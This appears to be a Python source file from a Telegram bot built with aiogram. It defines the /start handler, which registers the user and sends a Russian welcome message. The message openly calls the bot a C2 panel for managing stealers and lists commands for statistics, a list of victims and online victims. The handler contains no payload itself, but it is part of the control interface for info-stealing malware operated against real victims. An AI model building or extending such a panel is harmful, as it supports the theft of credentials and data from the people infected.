from aiogram import Router, types
from aiogram.filters import Command
from bot.database.db_manager import DatabaseManager
from bot.keyboards.reply import main_menu_keyboard
from bot.services.utils import format_user_info

router = Router()
db = DatabaseManager()


@router.message(Command("start"))
async def cmd_start(message: types.Message):
    """Обработчик команды /start"""
    user = await db.get_or_create_user(
        telegram_id=message.from_user.id,
        username=message.from_user.username,
        first_name=message.from_user.first_name,
        last_name=message.from_user.last_name
    )

    welcome_text = (
        f"👋 <b>Добро пожаловать, {message.from_user.first_name}!</b>\n\n"
        f"Это C2 панель для управления стиллерами.\n"
        f"Ваш статус: {'👑 Администратор' if user.is_admin else '👤 Пользователь'}\n\n"
        f"<b>Доступные команды:</b>\n"
        f"/stats - Статистика\n"
        f"/victims - Список жертв\n"
        f"/online - Онлайн жертвы\n"
        f"/help - Помощь\n"
    )

    await message.answer(
        welcome_text,
        reply_markup=main_menu_keyboard(user.is_admin)
    )